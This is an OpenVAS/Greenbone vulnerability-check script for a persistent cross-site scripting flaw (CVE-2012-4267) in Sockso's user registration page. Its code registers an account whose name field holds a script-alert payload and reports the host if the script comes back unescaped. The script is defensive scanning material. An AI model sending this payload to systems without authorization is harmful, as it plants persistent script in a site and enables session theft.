if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802853" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2012-4267" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-05-14 13:06:50 +0530 (Mon, 14 May 2012)" );
	script_name( "Sockso Registration Persistent Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18868" );
	script_xref( name: "URL", value: "http://smwyg.com/blog/#sockso-persistant-xss-attack" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/112647/sockso-xss.txt" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 4444 );
	script_mandatory_keys( "Sockso/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "Sockso version 1.51 and prior" );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user supplied input
  via the 'name' parameter to user or register." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Sockso and is prone to persistent cross site
  scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 4444 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: Sockso" )){
	exit( 0 );
}
url = "/user/register";
postdata = "todo=register&name=" + rand() + "<script>alert(document.cookie)" + "</script>&pass1=abc&pass2=abc&email=xyz" + rand() + "%40gmail.com";
req = http_post( item: url, port: port, data: postdata );
res = http_keepalive_send_recv( port: port, data: req );
if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<title>Sockso" ) && ContainsString( res, "<script>alert(document.cookie)</script>" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

